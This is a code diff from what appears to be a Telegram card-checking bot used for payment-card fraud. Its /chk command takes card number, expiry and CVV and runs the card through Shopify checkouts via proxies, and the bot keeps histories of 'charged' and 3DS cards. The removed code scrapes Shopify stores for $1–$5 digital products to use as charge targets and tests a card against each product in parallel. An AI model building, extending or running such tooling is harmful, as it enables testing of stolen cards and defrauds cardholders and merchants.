-        update_user_setting(user_id, "products", products)
-        reset_scraper_session(user_id)
-
-        result_msg = f"✅ *Added {added_count} products!*\n\n"
-        if already_exists > 0:
-            result_msg += f"⚠️ {already_exists} products were already in your list\n"
-        result_msg += f"📦 Total products: {len(products)}"
-
-        await query.edit_message_text(
-            result_msg,
-            parse_mode="Markdown",
-            reply_markup=InlineKeyboardMarkup([
-                [InlineKeyboardButton("📦 View Products", callback_data="menu_products")],
-                [InlineKeyboardButton("◀️ Main Menu", callback_data="menu_main")]
-            ])
-        )
-
-    elif data == "scrape_cancel":
-        # Cancel scraping
-        reset_scraper_session(user_id)
-        await query.edit_message_text(
-            "❌ Product search cancelled.",
-            reply_markup=InlineKeyboardMarkup([
-                [InlineKeyboardButton("◀️ Main Menu", callback_data="menu_main")]
-            ])
-        )
-
-
 async def setproxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle /setproxy command"""
     user_id = update.effective_user.id
@@ -3146,451 +2521,6 @@ async def setproxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     else:
         update_user_setting(user_id, "proxy", proxy_str)
         await update.message.reply_text(f"✅ Proxy set to: `{proxy_str}`", parse_mode="Markdown")
-
-
-def is_product_error(error_msg: str) -> bool:
-    """
-    Check if an error indicates an invalid/broken product that should be auto-removed.
-
-    This checks for:
-    1. Product permanently deleted/removed
-    2. Store/shop not found
-    3. Delivery/shipping configuration errors (product can't be used)
-    4. Checkout errors specific to the product
-
-    NOTE: These errors indicate the PRODUCT is the problem, not the card.
-    """
-    if not error_msg:
-        return False
-    error_lower = error_msg.lower()
-
-    # Product errors that should trigger auto-removal
-    product_error_indicators = [
-        # Product permanently deleted/removed
-        "product has been removed",
-        "product does not exist",
-        "product not found",
-        "couldn't find product",
-        "product unavailable",
-        "this product is no longer available",
-        "product is archived",
-
-        # Store/shop permanently gone
-        "store not found",
-        "shop not found",
-        "store does not exist",
-        "shop does not exist",
-        "this store is unavailable",
-
-        # Invalid URL structure
-        "not a valid shopify",
-        "invalid product url",
-        "invalid store url",
-        "invalid product",
-
-        # Delivery/shipping configuration errors
-        # These mean the product is misconfigured and can't be used
-        "no delivery option available",
-        "no delivery options",
-        "no available delivery strategy",
-        "no shipping method",
-        "no shipping options available",
-        "no shipping rates",
-        "can't ship to",
-        "cannot ship to",
-        "does not ship to",
-        "delivery not available",
-        "delivery strategy found",
-        "shipping not available",
-        "no rates available",
-        "unable to calculate shipping",
-        "shipping address is not valid",
-
-        # Checkout/cart errors specific to product
-        "can't add this item",
-        "cannot add to cart",
-        "item cannot be added",
-        "product cannot be purchased",
-        "not available for purchase",
-        "sold out",
-        "out of stock",
-        "inventory not available",
-        "no inventory",
-
-        # Variant/option errors
-        "variant not found",
-        "variant unavailable",
-        "no variants available",
-        "option not available",
-
-        # Price/currency errors
-        "price not available",
-        "currency not supported",
-
-        # Store blocked/restricted
-        "store blocked",
-        "access denied",
-        "store is password protected",
-    ]
-
-    return any(indicator in error_lower for indicator in product_error_indicators)
-
-
-async def remove_invalid_product(user_id: int, product_url: str, reason: str = "", bot=None):
-    """
-    Remove an invalid product from user's list and notify the user.
-
-    Args:
-        user_id: The user's Telegram ID
-        product_url: The product URL to remove
-        reason: The error message explaining why it was removed
-        bot: Optional Telegram bot instance for sending notifications
-    """
-    try:
-        settings = get_user_settings(user_id)
-        products = settings.get("products", [])
-        if product_url in products:
-            products.remove(product_url)
-            update_user_setting(user_id, "products", products)
-            remaining_count = len(products)
-
-            logger.warning(f"Auto-removed invalid product for user {user_id}: {product_url} - {reason}")
-
-            # Try to notify the user if we have a bot instance
-            if bot:
-                try:
-                    # Truncate URL for display
-                    short_url = product_url[:50] + "..." if len(product_url) > 50 else product_url
-                    short_reason = reason[:100] if reason else "Product error"
-
-                    await bot.send_message(
-                        chat_id=user_id,
-                        text=f"⚠️ *Product Auto-Removed*\n\n"
-                             f"🔗 `{short_url}`\n\n"
-                             f"❌ *Reason:* {short_reason}\n\n"
-                             f"📦 *Remaining products:* {remaining_count}\n\n"
-                             f"_Use /addproduct to add a new product._",
-                        parse_mode="Markdown"
-                    )
-                except Exception as notify_error:
-                    logger.debug(f"Could not send product removal notification: {notify_error}")
-
-            return True
-        return False
-    except Exception as e:
-        logger.error(f"Failed to remove invalid product: {e}")
-        return False
-
-
-async def validate_shopify_product(url: str, check_shipping: bool = False) -> tuple[bool, str]:
-    """
-    Validate if a URL is a valid Shopify product page.
-
-    Note: Shipping filter has been REMOVED - users can add ANY product (physical or digital).
-    The check_shipping parameter is kept for backwards compatibility but defaults to False.
-    """
-    try:
-        # Check URL format
-        if "/products/" not in url:
-            return False, "URL must contain '/products/' (Shopify product URL)"
-
-        # Try to fetch product JSON
-        json_url = url.rstrip('/') + ".json"
-
-        async with aiohttp.ClientSession() as session:
-            async with session.get(json_url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
-                if resp.status == 200:
-                    data = await resp.json()
-                    if "product" in data:
-                        product = data["product"]
-                        product_title = product.get("title", "Unknown")
-
-                        # Get product info for display
-                        variants = product.get("variants", [])
-                        requires_shipping = variants[0].get("requires_shipping", True) if variants else True
-                        shipping_info = "📦 Physical" if requires_shipping else "💻 Digital"
-
-                        return True, f"✅ Product found: {product_title}\n{shipping_info}"
-                    else:
-                        return False, "Not a valid Shopify product page"
-                elif resp.status == 404:
-                    return False, "Product not found (404)"
-                elif resp.status == 401 or resp.status == 403:
-                    # Some stores block JSON access - allow anyway, let API handle it
-                    return True, "✅ Product URL accepted (store blocks verification)"
-                else:
-                    return False, f"Failed to access product (HTTP {resp.status})"
-    except asyncio.TimeoutError:
-        return False, "Request timed out"
-    except Exception as e:
-        return False, f"Error: {str(e)[:50]}"
-
-
-# =============================================================================
-# PRODUCT SCRAPER - Auto-fetch low-price products from store
-# =============================================================================
-
-def is_store_url(url: str) -> bool:
-    """
-    Check if URL is a store URL (not a product URL).
-    Valid: https://store.com, https://store.com/collections/all
-    Invalid: https://store.com/products/item
-    """
-    if not url:
-        return False
-    url = url.strip().lower()
-
-    # Must be a valid URL
-    if not url.startswith(('http://', 'https://')):
-        return False
-
-    # Not a product URL
-    if '/products/' in url:
-        return False
-
-    # Check if it looks like a domain
-    import urllib.parse
-    parsed = urllib.parse.urlparse(url)
-    if not parsed.netloc:
-        return False
-
-    # Accept root domain or collections
-    path = parsed.path.strip('/')
-    if path == '' or path.startswith('collections'):
-        return True
-
-    return False
-
-
-def extract_store_domain(url: str) -> str:
-    """Extract the base store domain from a URL"""
-    import urllib.parse
-    parsed = urllib.parse.urlparse(url.strip())
-    scheme = parsed.scheme or 'https'
-    return f"{scheme}://{parsed.netloc}"
-
-
-async def fetch_shopify_products(store_url: str, min_price: float = 1.0, max_price: float = 5.0, max_products: int = 15) -> tuple[list, str]:
-    """
-    Fetch products from a Shopify store within a price range.
-    Returns (list of products, error message or empty string)
-    """
-    base_url = extract_store_domain(store_url)
-    products_found = []
-    page = 1
-
-    try:
-        async with aiohttp.ClientSession() as session:
-            while len(products_found) < max_products and page <= 5:  # Max 5 pages
-                url = f"{base_url}/products.json?limit=250&page={page}"
-
-                try:
-                    async with session.get(url, timeout=aiohttp.ClientTimeout(total=15)) as resp:
-                        if resp.status == 404:
-                            return [], "Not a Shopify store or store not found"
-                        elif resp.status == 401 or resp.status == 403:
-                            return [], "Store blocked access to product data"
-                        elif resp.status != 200:
-                            return [], f"Failed to access store (HTTP {resp.status})"
-
-                        data = await resp.json()
-                        store_products = data.get("products", [])
-
-                        if not store_products:
-                            break  # No more products
-
-                        for product in store_products:
-                            if len(products_found) >= max_products:
-                                break
-
-                            # Get first variant price
-                            variants = product.get("variants", [])
-                            if not variants:
-                                continue
-
-                            first_variant = variants[0]
-
-                            # Get shipping status for display (but don't filter on it)
-                            requires_shipping = first_variant.get("requires_shipping", True)
-
-                            try:
-                                price = float(first_variant.get("price", "0"))
-                            except (ValueError, TypeError):
-                                continue
-
-                            # Filter by price range ONLY (no shipping filter)
-                            if min_price <= price <= max_price:
-                                product_handle = product.get("handle", "")
-                                product_url = f"{base_url}/products/{product_handle}"
-
-                                products_found.append({
-                                    "title": product.get("title", "Unknown"),
-                                    "price": price,
-                                    "url": product_url,
-                                    "handle": product_handle,
-                                    "id": product.get("id", 0),
-                                    "requires_shipping": requires_shipping  # Keep for info display
-                                })
-
-                        page += 1
-
-                except asyncio.TimeoutError:
-                    return [], "Request timed out - store may be slow"
-                except json.JSONDecodeError:
-                    return [], "Invalid response from store"
-
-        return products_found, ""
-
-    except Exception as e:
-        logger.error(f"Error fetching products from {store_url}: {e}")
-        return [], f"Error: {str(e)[:50]}"
-
-
-def get_product_scraper_keyboard(products: list, selected: set, page: int = 0, per_page: int = 8) -> InlineKeyboardMarkup:
-    """Generate keyboard for product selection with pagination"""
-    buttons = []
-    start = page * per_page
-    end = min(start + per_page, len(products))
-    total_pages = (len(products) + per_page - 1) // per_page
-
-    for i, product in enumerate(products[start:end]):
-        idx = start + i
-        is_selected = idx in selected
-        checkbox = "☑️" if is_selected else "☐"
-        price_str = f"${product['price']:.2f}"
-        # Truncate title if too long
-        title = product['title'][:30] + "..." if len(product['title']) > 30 else product['title']
-        button_text = f"{checkbox} {title} - {price_str}"
-        buttons.append([InlineKeyboardButton(button_text, callback_data=f"scrape_toggle_{idx}")])
-
-    # Navigation and action buttons
-    nav_buttons = []
-    if page > 0:
-        nav_buttons.append(InlineKeyboardButton("◀️ Prev", callback_data=f"scrape_page_{page-1}"))
-    if page < total_pages - 1:
-        nav_buttons.append(InlineKeyboardButton("Next ▶️", callback_data=f"scrape_page_{page+1}"))
-
-    if nav_buttons:
-        buttons.append(nav_buttons)
-
-    # Action buttons
-    select_text = "Deselect All" if len(selected) == len(products) else "Select All"
-    buttons.append([
-        InlineKeyboardButton(f"🔘 {select_text}", callback_data="scrape_toggle_all"),
-        InlineKeyboardButton(f"✅ Add ({len(selected)})", callback_data="scrape_add")
-    ])
-    buttons.append([InlineKeyboardButton("❌ Cancel", callback_data="scrape_cancel")])
-
-    return InlineKeyboardMarkup(buttons)
-
-
-async def addproduct_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle /addproduct command"""
-    user_id = update.effective_user.id
-
-    if not context.args:
-        await update.message.reply_text(
-            "❌ Usage: `/addproduct <shopify_product_url>`\n"
-            "Example: `/addproduct https://store.com/products/item`\n\n"
-            "⚠️ Only digital/virtual products are accepted (no shipping required).",
-            parse_mode="Markdown"
-        )
-        return
-
-    url = context.args[0]
-    settings = get_user_settings(user_id)
-    products = settings.get("products", [])
-
-    if url in products:
-        await update.message.reply_text("⚠️ This product URL is already in your list.")
-        return
-
-    # Validate the product URL and check shipping requirements
-    status_msg = await update.message.reply_text(
-        "⏳ Validating product...\n\n"
-        "_Checking if product is digital (no shipping)..._",
-        parse_mode="Markdown"
-    )
-
-    is_valid, message = await validate_shopify_product(url, check_shipping=True)
-
-    if is_valid:
-        products.append(url)
-        update_user_setting(user_id, "products", products)
-        await status_msg.edit_text(
-            f"✅ Product added!\n\n"
-            f"📝 {message}\n"
-            f"📦 Total products: {len(products)}",
-            parse_mode="Markdown"
-        )
-    else:
-        await status_msg.edit_text(
-            f"❌ *Cannot add product*\n\n"
-            f"📝 {message}\n\n"
-            f"_Only digital/virtual products are supported._",
-            parse_mode="Markdown"
-        )
-
-
-async def removeproduct_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle /removeproduct command"""
-    user_id = update.effective_user.id
-
-    if not context.args:
-        await update.message.reply_text(
-            "❌ Usage: `/removeproduct <url>`\n"
-            "Example: `/removeproduct https://store.com/products/item`\n\n"
-            "Use `/products` to see your product list.",
-            parse_mode="Markdown"
-        )
-        return
-
-    url = context.args[0]
-    settings = get_user_settings(user_id)
-    products = settings.get("products", [])
-
-    if url in products:
-        products.remove(url)
-        update_user_setting(user_id, "products", products)
-        await update.message.reply_text(
-            f"✅ Product removed!\n\n"
-            f"📦 Remaining products: {len(products)}",
-            parse_mode="Markdown"
-        )
-    else:
-        await update.message.reply_text(
-            "❌ Product not found in your list.\n\n"
-            "Use `/products` to see your saved products.",
-            parse_mode="Markdown"
-        )
-
-
-async def products_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle /products command - list all products"""
-    user_id = update.effective_user.id
-    settings = get_user_settings(user_id)
-
-    if not settings["products"]:
-        await update.message.reply_text(
-            "📦 *Your Product List*\n\n"
-            "No products set. Using default product.\n\n"
-            "Add products with: `/addproduct <url>`",
-            parse_mode="Markdown"
-        )
-        return
-
-    products_text = "\n".join([f"{i+1}. `{url}`" for i, url in enumerate(settings["products"])])
-    await update.message.reply_text(
-        f"📦 *Your Product List*\n\n{products_text}",
-        parse_mode="Markdown"
-    )
-
-
-async def clearproducts_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle /clearproducts command"""
-    user_id = update.effective_user.id
-    update_user_setting(user_id, "products", [])
-    await update.message.reply_text("✅ All products cleared!")
 
 
 async def send_card_history(chat_id, bot, target_user_id: int, card_type: str, reply_to_message_id=None):
@@ -3729,92 +2659,6 @@ async def get3ds_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         target_user_id=target_user_id,
         card_type="3ds",
         reply_to_message_id=update.message.message_id
-    )
-
-
-async def findproducts_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle /findproducts command - search for low-price products in a Shopify store"""
-    user_id = update.effective_user.id
-
-    if is_user_banned(user_id):
-        await update.message.reply_text("🚫 You are banned from using this bot.")
-        return
-
-    if not context.args:
-        await update.message.reply_text(
-            "🔍 *Find Low-Price Products*\n\n"
-            "Usage: `/findproducts <store_url>`\n\n"
-            "Example:\n"
-            "`/findproducts https://example-store.com`\n\n"
-            "This will search for products priced $1-$5",
-            parse_mode="Markdown"
-        )
-        return
-
-    store_url = context.args[0].strip()
-
-    # Validate URL
-    if not store_url.startswith(('http://', 'https://')):
-        store_url = 'https://' + store_url
-
-    if '/products/' in store_url:
-        await update.message.reply_text(
-            "❌ That looks like a product URL, not a store URL.\n\n"
-            "Please provide the store's main URL:\n"
-            "✅ `https://store.com`\n"
-            "❌ `https://store.com/products/item`",
-            parse_mode="Markdown"
-        )
-        return
-
-    status_msg = await update.message.reply_text(
-        "🔍 *Searching for products ($1-$5)...*\n\n"
-        "This may take a moment...",
-        parse_mode="Markdown"
-    )
-
-    # Fetch products
-    products, error = await fetch_shopify_products(store_url, min_price=1.0, max_price=5.0, max_products=15)
-
-    if error:
-        await status_msg.edit_text(
-            f"❌ *Failed to fetch products*\n\n{error}\n\n"
-            f"Make sure this is a valid Shopify store.",
-            parse_mode="Markdown",
-            reply_markup=InlineKeyboardMarkup([
-                [InlineKeyboardButton("◀️ Main Menu", callback_data="menu_main")]
-            ])
-        )
-        return
-
-    if not products:
-        await status_msg.edit_text(
-            "⚠️ *No digital products found*\n\n"
-            "No digital products priced $1-$5 were found in this store.\n"
-            "_(Only products that don't require shipping are shown)_",
-            parse_mode="Markdown",
-            reply_markup=InlineKeyboardMarkup([
-                [InlineKeyboardButton("◀️ Main Menu", callback_data="menu_main")]
-            ])
-        )
-        return
-
-    # Store in session
-    scraper = get_scraper_session(user_id)
-    scraper["products"] = products
-    scraper["selected"] = set()
-    scraper["page"] = 0
-    scraper["store_url"] = store_url
-
-    # Display products
-    store_domain = extract_store_domain(store_url)
-    await status_msg.edit_text(
-        f"🛒 *Found {len(products)} digital products* ($1-$5)\n"
-        f"📍 Store: `{store_domain}`\n\n"
-        f"Select products to add:\n"
-        f"_(Digital products only - no shipping required)_",
-        parse_mode="Markdown",
-        reply_markup=get_product_scraper_keyboard(products, set(), 0)
     )
 
 
@@ -4115,16 +2959,6 @@ async def get_user_details(user_id: int):
 async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle /chk command for single card"""
     user_id = update.effective_user.id
-
-    # Check if user has products set
-    if not user_has_products(user_id):
-        await update.message.reply_text(
-            "❌ *No product set!*\n\n"
-            "Use the menu to add a product first.",
-            parse_mode="Markdown",
-            reply_markup=get_main_menu_keyboard(user_id)
-        )
-        return
 
     if not context.args:
         await update.message.reply_text("❌ Usage: `/chk 4111111111111111|12|2025|123`", parse_mode="Markdown")
@@ -4661,16 +3495,6 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.message.reply_text("🚫 You are banned from using this bot.")
             return
 
-        # Check if user has products set
-        if not user_has_products(user_id):
-            await update.message.reply_text(
-                "❌ *No product set!*\n\n"
-                "Use the menu to add a product first.",
-                parse_mode="Markdown",
-                reply_markup=get_main_menu_keyboard(user_id)
-            )
-            return
-
         # Check file extension
         file_name = document.file_name or ""
         if not file_name.lower().endswith('.txt'):
@@ -4853,165 +3677,6 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 parse_mode="Markdown",
                 reply_markup=get_back_keyboard("menu_proxy")
             )
-        return
-
-    # Handle clean products input (test card)
-    if waiting_for == "clean_products":
-        set_waiting_for(user_id, None)
-
-        # Validate the test card
-        card = text.strip()
-        is_valid, validation_error, parsed_card = validate_card_full(card)
-
-        if not is_valid:
-            await update.message.reply_text(
-                f"❌ *Invalid Test Card*\n\n{validation_error}\n\n"
-                "Please use format: `card|mm|yyyy|cvv`",
-                parse_mode="Markdown",
-                reply_markup=get_back_keyboard("menu_products")
-            )
-            return
-
-        settings = get_user_settings(user_id)
-        products = settings.get("products", [])
-
-        if not products:
-            await update.message.reply_text(
-                "❌ *No products to clean!*",
-                parse_mode="Markdown",
-                reply_markup=get_back_keyboard("menu_products")
-            )
-            return
-
-        # Show progress message
-        status_msg = await update.message.reply_text(
-            f"🧹 *Cleaning {len(products)} products...*\n\n"
-            f"⏳ Progress: 0/{len(products)}\n"
-            f"✅ Working: 0\n"
-            f"❌ Failed: 0",
-            parse_mode="Markdown"
-        )
-
-        # Get user's proxy settings
-        user_proxy = settings.get("proxy")
-        if isinstance(user_proxy, list):
-            proxies = user_proxy if user_proxy else config.PROXY_LIST
-        elif user_proxy:
-            proxies = [user_proxy]
-        else:
-            proxies = config.PROXY_LIST
-
-        # Progress tracking
-        progress = {"done": 0, "working": 0, "failed": 0, "total": len(products)}
-        last_update = [0]  # Use list to allow modification in nested function
-
-        async def update_progress():
-            """Update progress message (max once per second)"""
-            import time
-            now = time.time()
-            if now - last_update[0] >= 1:  # Update at most once per second
-                last_update[0] = now
-                try:
-                    await status_msg.edit_text(
-                        f"🧹 *Cleaning {progress['total']} products...*\n\n"
-                        f"⏳ Progress: {progress['done']}/{progress['total']}\n"
-                        f"✅ Working: {progress['working']}\n"
-                        f"❌ Failed: {progress['failed']}",
-                        parse_mode="Markdown"
-                    )
-                except:
-                    pass
-
-        # Test products in PARALLEL for speed
-        async def test_product(product_url):
-            try:
-                response = await asyncio.wait_for(
-                    auto_shopify_client(
-                        card=card,
-                        product_url=product_url,
-                        email=settings.get("email") or config.DEFAULT_EMAIL,
-                        is_shippable=settings.get("is_shippable", config.IS_SHIPPABLE),
-                        proxies=proxies,
-                        logger=logger
-                    ),
-                    timeout=30  # 30 second timeout per product
-                )
-                error_msg = response.get("error", "") if response else ""
-                if is_product_error(error_msg):
-                    progress["failed"] += 1
-                    progress["done"] += 1
-                    await update_progress()
-                    return (product_url, False, error_msg)
-                else:
-                    progress["working"] += 1
-                    progress["done"] += 1
-                    await update_progress()
-                    return (product_url, True, "")
-            except asyncio.TimeoutError:
-                progress["working"] += 1
-                progress["done"] += 1
-                await update_progress()
-                return (product_url, True, "")  # Keep on timeout
-            except Exception as e:
-                progress["working"] += 1
-                progress["done"] += 1
-                await update_progress()
-                return (product_url, True, "")  # Keep on error
-
-        # Run all tests in parallel (max 5 concurrent to avoid rate limits)
-        semaphore = asyncio.Semaphore(5)
-        async def test_with_limit(url):
-            async with semaphore:
-                return await test_product(url)
-
-        results = await asyncio.gather(*[test_with_limit(url) for url in products])
-
-        # Process results
-        working_products = []
-        failed_products = []
-        for product_url, is_working, error_msg in results:
-            if is_working:
-                working_products.append(product_url)
-            else:
-                failed_products.append((product_url, error_msg))
-
-        # Update the user's products to only keep working ones
-        if working_products or not failed_products:
-            update_user_setting(user_id, "products", working_products)
-
-        # Build result message
-        result_text = f"🧹 *Product Cleaning Complete!*\n\n"
-        result_text += f"📊 *Summary:*\n"
-        result_text += f"• ✅ Working: {len(working_products)}\n"
-        result_text += f"• ❌ Removed: {len(failed_products)}\n\n"
-
-        if working_products:
-            result_text += "*✅ Kept Products:*\n"
-            for i, url in enumerate(working_products[:5], 1):
-                short = url.split("/products/")[-1][:25] if "/products/" in url else url[:25]
-                result_text += f"{i}. `{short}`\n"
-            if len(working_products) > 5:
-                result_text += f"_...and {len(working_products) - 5} more_\n"
-            result_text += "\n"
-
-        if failed_products:
-            result_text += "*❌ Removed Products:*\n"
-            for i, (url, reason) in enumerate(failed_products[:5], 1):
-                short = url.split("/products/")[-1][:20] if "/products/" in url else url[:20]
-                short_reason = reason[:30] + "..." if len(reason) > 30 else reason
-                result_text += f"{i}. `{short}`\n   └ _{short_reason}_\n"
-            if len(failed_products) > 5:
-                result_text += f"_...and {len(failed_products) - 5} more_\n"
-
-        if not working_products and failed_products:
-            result_text += "\n⚠️ *All products were removed!*\n"
-            result_text += "Use /addproduct to add new products."
-
-        await status_msg.edit_text(
-            result_text,
-            parse_mode="Markdown",
-            reply_markup=get_back_keyboard("menu_products")
-        )
         return
 
     # =============================================================================
@@ -5302,72 +3967,6 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             )
         return
 
-    # Handle store URL input for product scraping
-    if waiting_for == "store_url":
-        set_waiting_for(user_id, None)
-        store_url = text.strip()
-
-        if not store_url.startswith(('http://', 'https://')):
-            store_url = 'https://' + store_url
-
-        if '/products/' in store_url:
-            await update.message.reply_text(
-                "❌ That looks like a product URL, not a store URL.\n\n"
-                "Please provide the store's main URL:\n"
-                "✅ `https://store.com`\n"
-                "❌ `https://store.com/products/item`",
-                parse_mode="Markdown",
-                reply_markup=get_back_keyboard("menu_products")
-            )
-            return
-
-        status_msg = await update.message.reply_text(
-            "🔍 *Searching for products ($1-$5)...*\n\n"
-            "This may take a moment...",
-            parse_mode="Markdown"
-        )
-
-        # Fetch products
-        products, error = await fetch_shopify_products(store_url, min_price=1.0, max_price=5.0, max_products=15)
-
-        if error:
-            await status_msg.edit_text(
-                f"❌ *Failed to fetch products*\n\n{error}\n\n"
-                f"Make sure this is a valid Shopify store.",
-                parse_mode="Markdown",
-                reply_markup=get_back_keyboard("menu_products")
-            )
-            return
-
-        if not products:
-            await status_msg.edit_text(
-                "⚠️ *No digital products found*\n\n"
-                "No digital products priced $1-$5 were found in this store.\n"
-                "_(Only products that don't require shipping are shown)_",
-                parse_mode="Markdown",
-                reply_markup=get_back_keyboard("menu_products")
-            )
-            return
-
-        # Store in session
-        scraper = get_scraper_session(user_id)
-        scraper["products"] = products
-        scraper["selected"] = set()
-        scraper["page"] = 0
-        scraper["store_url"] = store_url
-
-        # Display products
-        store_domain = extract_store_domain(store_url)
-        await status_msg.edit_text(
-            f"🛒 *Found {len(products)} digital products* ($1-$5)\n"
-            f"📍 Store: `{store_domain}`\n\n"
-            f"Select products to add:\n"
-            f"_(Digital products only - no shipping required)_",
-            parse_mode="Markdown",
-            reply_markup=get_product_scraper_keyboard(products, set(), 0)
-        )
-        return
-
     # Handle admin search for charged cards by user ID
     if waiting_for == "charged_user_search":
         set_waiting_for(user_id, None)
@@ -5414,184 +4013,6 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         return
 
-    # Handle product input - validate product exists, but allow any product type
-    # Shipping/delivery errors will be auto-removed during card checking
-    if waiting_for == "product":
-        set_waiting_for(user_id, None)
-
-        # Extract URLs from text - support both direct URLs and formatted text
-        # Pattern matches URLs containing /products/
-        import re
-        url_pattern = r'https?://[^\s<>"\']+/products/[^\s<>"\']*'
-        extracted_urls = re.findall(url_pattern, text)
-
-        # Clean extracted URLs (remove trailing punctuation)
-        cleaned_urls = []
-        for url in extracted_urls:
-            # Remove trailing punctuation that might have been captured
-            url = url.rstrip('.,;:!?)>\'"')
-            if url and "/products/" in url:
-                cleaned_urls.append(url)
-
-        # If no URLs found via regex, fall back to line-by-line parsing
-        if not cleaned_urls:
-            raw_urls = [u.strip() for u in text.strip().split('\n') if u.strip()]
-            cleaned_urls = [u for u in raw_urls if "/products/" in u]
-
-        # Remove duplicates while preserving order
-        seen = set()
-        product_urls = []
-        for url in cleaned_urls:
-            if url not in seen:
-                seen.add(url)
-                product_urls.append(url)
-
-        if not product_urls:
-            await update.message.reply_text(
-                "❌ *No product URLs found!*\n\n"
-                "Send a product URL containing `/products/`\n"
-                "Or paste text containing product URLs\n\n"
-                "Example:\n"
-                "`https://store.com/products/item`\n\n"
-                "Or paste formatted text like:\n"
-                "`Product URL: https://store.com/products/item`",
-                parse_mode="Markdown",
-                reply_markup=get_back_keyboard("menu_products")
-            )
-            return
-
-        if not product_urls:
-            await update.message.reply_text(
-                "❌ *Invalid URL(s)!*\n\n"
-                "URL must contain `/products/`\n\n"
-                "Example: `https://store.com/products/item`",
-                parse_mode="Markdown",
-                reply_markup=get_back_keyboard("menu_products")
-            )
-            return
-
-        # Get current products
-        settings = get_user_settings(user_id)
-        current_products = settings.get("products", [])
-
-        # Filter duplicates first (fast, no network)
-        duplicate_products = [url for url in product_urls if url in current_products]
-        urls_to_validate = [url for url in product_urls if url not in current_products]
-
-        if not urls_to_validate:
-            await update.message.reply_text(
-                f"⚠️ *All {len(duplicate_products)} product(s) already added!*",
-                parse_mode="Markdown",
-                reply_markup=get_back_keyboard("menu_products")
-            )
-            return
-
-        # Show validation status
-        status_msg = await update.message.reply_text(
-            f"⏳ *Adding {len(urls_to_validate)} product(s)...*\n\n"
-            "_Skipping validation for speed_",
-            parse_mode="Markdown"
-        )
-
-        # SKIP validation - just add all products directly
-        # Bad products will be auto-removed during card checking via is_product_error()
-        added_products = []
-        for url in urls_to_validate:
-            current_products.append(url)
-            short_url = url.split('/products/')[-1][:25] if '/products/' in url else url[:25]
-            added_products.append((url, short_url))
-
-        # Save updated products
-        update_user_setting(user_id, "products", current_products)
-
-        # Build response
-        if len(added_products) == 1:
-            url, short = added_products[0]
-            result_text = f"✅ *Product Added!*\n\n📦 `{short}`\n\n📊 Total: {len(current_products)} products"
-        else:
-            result_text = f"✅ *{len(added_products)} Products Added!*\n\n"
-            for i, (url, short) in enumerate(added_products[:8], 1):
-                result_text += f"{i}. `{short}`\n"
-            if len(added_products) > 8:
-                result_text += f"_...and {len(added_products) - 8} more_\n"
-            result_text += f"\n📊 Total: {len(current_products)} products"
-
-        # Show warnings
-        if duplicate_products:
-            result_text += f"\n\n⚠️ *{len(duplicate_products)} duplicate(s) skipped*"
-
-        result_text += "\n\n_🧹 Use Clean Products to remove broken ones_"
-
-        await status_msg.edit_text(
-            result_text,
-            parse_mode="Markdown",
-            reply_markup=get_back_keyboard("menu_products")
-        )
-        return
-
-    # =============================================================================
-    # AUTO-DETECT STORE URLS FOR PRODUCT SCRAPING
-    # =============================================================================
-
-    # Check if text looks like a store URL (not a product URL)
-    text_stripped = text.strip()
-    if text_stripped.startswith(('http://', 'https://')) and is_store_url(text_stripped):
-        # User sent a store URL - trigger product scraping
-        if is_user_banned(user_id):
-            await update.message.reply_text("🚫 You are banned from using this bot.")
-            return
-
-        status_msg = await update.message.reply_text(
-            "🔍 *Searching for products ($1-$5)...*\n\n"
-            "This may take a moment...",
-            parse_mode="Markdown"
-        )
-
-        # Fetch products
-        products, error = await fetch_shopify_products(text_stripped, min_price=1.0, max_price=5.0, max_products=15)
-
-        if error:
-            await status_msg.edit_text(
-                f"❌ *Failed to fetch products*\n\n{error}\n\n"
-                f"Make sure this is a valid Shopify store.",
-                parse_mode="Markdown",
-                reply_markup=InlineKeyboardMarkup([
-                    [InlineKeyboardButton("◀️ Main Menu", callback_data="menu_main")]
-                ])
-            )
-            return
-
-        if not products:
-            await status_msg.edit_text(
-                "⚠️ *No digital products found*\n\n"
-                "No digital products priced $1-$5 were found in this store.\n"
-                "_(Only products that don't require shipping are shown)_",
-                parse_mode="Markdown",
-                reply_markup=InlineKeyboardMarkup([
-                    [InlineKeyboardButton("◀️ Main Menu", callback_data="menu_main")]
-                ])
-            )
-            return
-
-        # Store in session
-        scraper = get_scraper_session(user_id)
-        scraper["products"] = products
-        scraper["selected"] = set()
-        scraper["page"] = 0
-        scraper["store_url"] = text_stripped
-
-        # Display products
-        store_domain = extract_store_domain(text_stripped)
-        await status_msg.edit_text(
-            f"🛒 *Found {len(products)} digital products* ($1-$5)\n"
-            f"📍 Store: `{store_domain}`\n\n"
-            f"Select products to add:\n"
-            f"_(Digital products only - no shipping required)_",
-            parse_mode="Markdown",
-            reply_markup=get_product_scraper_keyboard(products, set(), 0)
-        )
-        return
-
     # Parse cards from message
     cards = create_lista_(text)
 
@@ -5601,16 +4022,6 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # Check if user is banned
     if is_user_banned(user_id):
         await update.message.reply_text("🚫 You are banned from using this bot.")
-        return
-
-    # Check if user has products set
-    if not user_has_products(user_id):
-        await update.message.reply_text(
-            "❌ *No product set!*\n\n"
-            "Use /menu → Products → Add Product",
-            parse_mode="Markdown",
-            reply_markup=get_main_menu_keyboard(user_id)
-        )
         return
 
     # Check credits before processing
@@ -5733,11 +4144,6 @@ def main():
     app.add_handler(CommandHandler("start", start_command))
     app.add_handler(CommandHandler("menu", menu_command))
     app.add_handler(CommandHandler("setproxy", setproxy_command))
-    app.add_handler(CommandHandler("addproduct", addproduct_command))
-    app.add_handler(CommandHandler("removeproduct", removeproduct_command))
